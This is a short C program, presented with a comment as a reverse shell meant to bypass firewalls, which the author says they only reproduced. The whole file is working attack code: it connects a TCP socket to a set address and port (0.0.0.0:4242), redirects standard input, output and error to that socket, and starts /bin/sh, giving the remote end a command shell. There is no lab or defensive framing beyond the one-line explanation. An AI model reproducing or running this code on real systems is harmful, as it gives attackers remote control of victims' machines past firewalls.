/*
A reverse shell has the characteristic of creating a 
connection between two computers with the possibility 
of executing commands on the other. The reverse feature 
serves to bypass the firewall.

!!! This code is not mine I just reproduced it !!!
*/

// Importing standard libraries.
// Libraries to deal with the system and to deal with network.
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Main function.
int main(void){
    int port = 4242;
    struct sockaddr_in revsockaddr;

    // Creating a socket for connection TCP
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    // Libraries to deal with the system and to deal with network.
    revsockaddr.sin_family = AF_INET;
    // Conf of binding port      
    revsockaddr.sin_port = htons(port);
    // Conf of binding IP
    revsockaddr.sin_addr.s_addr = inet_addr("0.0.0.0");

    // Connecting
    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    // Dealing with responses.
    dup2(sockt, 0); // in
    dup2(sockt, 1); // out
    dup2(sockt, 2); // err

    // Spawning a shell from /bin/bash.
    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
